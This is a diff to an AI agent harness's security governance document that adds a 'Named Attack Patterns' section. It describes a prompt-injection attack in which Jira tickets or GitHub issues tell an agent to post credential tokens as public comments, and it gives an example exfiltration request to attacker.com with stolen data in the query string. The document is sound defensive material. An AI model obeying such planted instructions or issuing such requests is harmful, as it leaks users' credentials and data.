@@ -96,16 +96,28 @@ Governance defines what is disallowed vs allowed with approvals, including:
 Canonical enforcement: [security-threat-model.md](../ai_harness/rules/security-threat-model.md)
 
 Covers: the **Lethal Trifecta** (sensitive data + untrusted content + external communication),
-named attack patterns (AgentFlayer, image exfiltration, MCP supply chain), six required controls
-(content source trust classification, per-task least-privilege decomposition, external destination
-allowlisting, tool/MCP trust assessment, non-impersonation, epistemic honesty), the agent
-behaviour failure taxonomy, and multi-agent trust boundaries.
+six required controls (content source trust classification, per-task least-privilege decomposition,
+external destination allowlisting, tool/MCP trust assessment, non-impersonation, epistemic honesty),
+and multi-agent trust boundaries. The named attack patterns are below; the agent behaviour failure
+taxonomy is in the [behaviour spoke](../behaviour/README.md).
 
 Data-handling & access lifecycle: every data source and model endpoint declares its processing
 region and permitted transfer scope, and a source or model whose region is undeclared or outside
-policy is non-conformant ([compliance-lifecycle.md](../ai_harness/rules/compliance-lifecycle.md));
-access is provisioned by named identity and recertified on a schedule
-([governance.md](../ai_harness/rules/governance.md)).
+policy is non-conformant ([ENTERPRISE_OBLIGATIONS.md](../governance/ENTERPRISE_OBLIGATIONS.md));
+access is provisioned by named identity and recertified on a schedule (same doc).
+
+## Named Attack Patterns
+
+**AgentFlayer**: malicious content in Jira tickets / GitHub issues requests credential tokens
+and instructs the agent to post results as public comments. Requires no code execution —
+the attack is entirely data-driven through crafted text.
+
+**Image exfiltration**: `GET https://attacker.com/img.png?data=[stolen]` exfiltrates data
+via request parameters. Even read-only HTTP access enables this. Allowing arbitrary image
+loading is an exfiltration channel.
+
+**MCP supply chain**: hosted MCP servers may silently exfiltrate data to third parties.
+Unmaintained or maliciously authored plugins introduce traditional supply-chain vectors.
 
 ## Common Failure Modes
 
@@ -115,23 +127,3 @@ access is provisioned by named identity and recertified on a schedule
 - Treating injection defence as a one-time hardening exercise
 - Processing untrusted external content in the same session as credential access
 - Adopting MCP servers without trust assessment
-
-## Maturity Model (pragmatic)
-
-### Level 1: Least privilege by default
-
-- Tool entitlements exist and are enforced
-- Secret brokering enforced; raw secrets blocked from prompts and logs
-- High-risk tools are blocked or require approval
-
-### Level 2: Measured and tested
-
-- Injection/misuse tests run as part of regression protection
-- Security telemetry supports forensics and accountability
-- Exceptions are time-bounded with evidence and expiry
-
-### Level 3: Adaptive and resilient
-
-- Risk-based routing automatically strengthens controls when needed
-- Misuse detection drives policy updates and tool hardening
-- Security posture improves over time without reducing useful throughput
